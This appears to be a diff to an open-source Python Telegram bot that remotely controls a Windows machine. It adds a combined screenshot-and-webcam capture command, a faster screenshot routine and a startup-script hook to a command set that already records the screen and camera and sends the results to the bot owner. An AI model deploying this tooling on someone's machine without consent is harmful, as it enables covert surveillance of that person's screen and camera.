@@ -4,6 +4,8 @@ This code is meant only to run on Windows 10/11 (7 and 8 probably work as well),
 This code is NOT meant to be used without the owner's consent, it is meant for ethical use only, I am not responsable for any illegal use of this program.
 If you lose control of your telegram bot, you could potentially lose the control of YOUR OWN MACHINE.
 
+Also this bot can *NOT* be put in a group, it will not work.
+
 ~Riccardo Zappitelli
 """
 
@@ -145,6 +147,9 @@ def now() -> str:
 
 #GETTING TOKEN AND CHAT_ID
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
+    """
+    returns token, chatid, ngrok_token, tunnel_provider
+    """
     with open(filename) as fi:
         var = json.load(fi)
     return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
@@ -405,6 +410,7 @@ class PeppinoTelegram:
             # 📸 Camera & Screen
             Command("selfie", self.selfie, "Take webcam photo.", "📸 Camera", "🤳 Webcam Snapshot"),
             Command("screenshot", self.screenshot, "Capture screen.", "📸 Camera", "🖼️ Take Screenshot"),
+            Command("selfieandscreenshot", self.screenshotandselfie, "Caputre screen and webcam in the same image", "📸 Camera", "🤳🖼️ Take Screenshot&Webcam"),
             Command("fullclip", self.record_webcam_and_screen, "Record webcam and screen.", "📸 Camera", "🎞️ Record Full Clip"),
             Command("webcamclip", self.record_webcam, "Record webcam only.", "📸 Camera", "🎥 Record Webcam"),
             Command("screenclip", self.record_screen, "Record screen only.", "📸 Camera", "🖥️ Record Screen"),
@@ -542,10 +548,17 @@ class PeppinoTelegram:
             self.set_volume(old)
 
 
-    def __send_image(self, image_name: str, caption=None) -> bool:
+    def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None) -> int:
+        """
+        return a message id
+        """
         try:
-            with open(image_name, "rb") as image:
-                msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
+            assert (image_name is None) ^ (image_buf is None), "You can only use either image_name or image_buf"
+            if image_buf:
+                msg = self.bot.sendPhoto(self.owner_id, image_buf, caption=caption)["message_id"]
+            if image_name:
+                with open(image_name, "rb") as image:
+                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
             return msg
         except Exception as e:
             return self.bsend(f"Error while sending an image\n{e}")
@@ -999,6 +1012,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             registry.update(exported)
 
         for label, (command, action, description) in registry.items():
+            if label == STARTUP_SCRIPT_MARKER:
+                action()
+                continue
             new_command = Command(name=command,
                                   function=action,
                                   description=description,
@@ -1538,6 +1554,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def fart(self) -> None:
         self.__play_loaded_sound("fart")
 
+    def fastscreenshot(self, caption=None) -> List[Any]:
+        return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]
+
     def replyquickmenu(self) -> int:
         commands = [f"/{c.name}" for c in self.commands]
         keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
@@ -1759,16 +1778,27 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def rightclick(self) -> None:
         pg.rightClick() #no shit
 
-    def screenshot(self) -> int:
+    def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
         try:
-            filename = join(BURN_DIRECTORY,randompngname())
-            screenshot = pg.screenshot()
-            screenshot.save(filename)
-            message_id = self.__send_image(filename)
-            remove(filename)
-            return message_id
+            images = self.fastscreenshot()
+            for image in images:
+                remove(image)
         except Exception as e:
             return self.bsend(f"Error while getting screenshot\n{e}")
+
+    def screenshotandselfie(self) -> None:
+        self.opencap()
+        for scrt in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png")):
+            name = randompngname()
+            ret, image = screen_and_webcam_pic(self.cap, scrt)
+            if not ret: continue
+            
+            self.__send_image(image_buf=cv2_to_bytesio(image))
+            try:
+                remove(name)
+            except:
+                ...
+        self.closecap()
 
     def selfie(self, caption: str|None=None, reply_markup=None) -> None:
         try:
@@ -1811,9 +1841,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return True
 
     def connectioncheckerloop(self):
-        while 1:
+        while self.running:
             self.connected = check_connection()
-            sleep(60 if self.connected else 10)
+            sleep(15 if self.connected else 5)
 
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
@@ -2079,13 +2109,16 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
         else:
             self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
+
+        #cleanup update
+        self.bot.getUpdates(-1) #if the bot gets accidentally added to a group, which telepot can't handle, this will fix it
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
         STARTING_LOG_MESSAGE.edit("STARTED MESSAGE LOOP")
         STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
         while self.running:
             try:
-                sleep(1)
+                sleep(10)
             except KeyboardInterrupt:
                 self.bsend("🛑 Interrupted by host machine, bye bye.")
                 self.running = False
